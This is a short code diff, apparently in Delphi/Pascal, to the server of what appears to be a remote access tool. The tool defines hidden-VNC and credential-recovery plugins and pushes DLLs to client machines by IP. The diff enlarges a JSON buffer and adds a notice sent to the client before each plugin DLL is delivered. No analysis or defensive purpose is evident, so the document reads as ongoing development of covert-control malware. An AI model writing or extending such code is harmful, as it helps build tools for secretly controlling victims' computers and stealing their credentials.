@@ -28,7 +28,7 @@ const
   HIDDEN_VNC_PLUGIN_ID        = 'HiddenVNCPlugin';
   RECOVERY_PLUGIN_ID          = 'RecoveryPlugin';
 
-  MAX_JSON_BUFFER_SIZE      = 128 * 1024 * 1024;
+  MAX_JSON_BUFFER_SIZE      = 512 * 1024 * 1024;
   PACKET_TYPE_JSON          = $01;
   PACKET_TYPE_DLL           = $02;
   PACKET_TYPE_MONITOR_FRAME = $03;
@@ -972,6 +972,17 @@ begin
   end;
 
   DoLog(lcCommand, '"' + PluginID + '" sent to ' + IP);
+
+  { Inform client about incoming plugin to fix visual bug }
+  ErrObj := TJSONObject.Create;
+  try
+    ErrObj.AddPair('action', 'incoming_plugin');
+    ErrObj.AddPair('id',     PluginID);
+    SendJSON(aLine, ErrObj);
+  finally
+    ErrObj.Free;
+  end;
+
   SendBinaryPacket(aLine, PACKET_TYPE_DLL, DLLData);
 end;
 
@@ -1669,6 +1680,3 @@ begin
 end;
 
 end.
-
-
-
